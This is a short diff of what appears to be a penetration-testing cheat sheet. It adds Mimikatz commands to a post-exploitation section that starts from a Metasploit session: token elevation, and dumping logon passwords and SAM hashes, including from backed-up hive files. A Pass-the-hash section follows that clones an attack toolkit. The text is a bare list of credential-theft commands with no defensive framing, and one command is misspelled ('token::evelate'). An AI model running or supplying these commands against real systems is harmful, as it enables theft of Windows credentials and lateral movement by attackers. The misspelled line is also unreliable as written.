@@ -120,7 +120,10 @@ unzip mimikatz_trunk.zip
 (msf) session -i <id>  
 mimikatz.exe  
 (mimikatz) privilege::debug  
-(mimikatz) sekurlsa::logonPasswords full
+(mimikatz) sekurlsa::logonPasswords full  
+(mimikatz) token::evelate  
+(mimikatz) lsadump::sam  
+(mimikatz) lsadump::sam /system:..\SystemBkup.hiv /sam:..\SamBkup.hiv
 
 ## Pass-the-hash
 git clone https://github.com/byt3bl33d3r/pth-toolkit  
